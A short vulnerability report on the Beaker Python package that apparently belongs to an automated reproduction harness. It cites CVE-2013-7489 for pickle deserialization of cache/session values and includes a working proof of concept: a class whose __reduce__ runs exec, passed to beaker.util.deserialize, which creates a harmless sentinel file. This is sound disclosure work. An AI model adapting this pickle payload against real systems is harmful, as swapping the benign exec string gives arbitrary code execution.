report.body:
I found a vulnerability in this package. Beaker (de)serializes cache/session values with pickle.

Tracked as CVE-2013-7489.

Proof of concept:

```python
import os, tempfile, pickle
from beaker import util
sentinel = os.path.join(tempfile.gettempdir(), "slopgate_beaker")
try: os.remove(sentinel)
except OSError: pass
class Exploit:
    def __reduce__(self):
        return (exec, ("open(r'%s','w').close()" % sentinel,))
blob = pickle.dumps(Exploit())
try:
    util.deserialize(blob, "pickle")
except Exception as e:
    print("raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(sentinel) else "SLOPGATE:NOT_REPRODUCED")
```
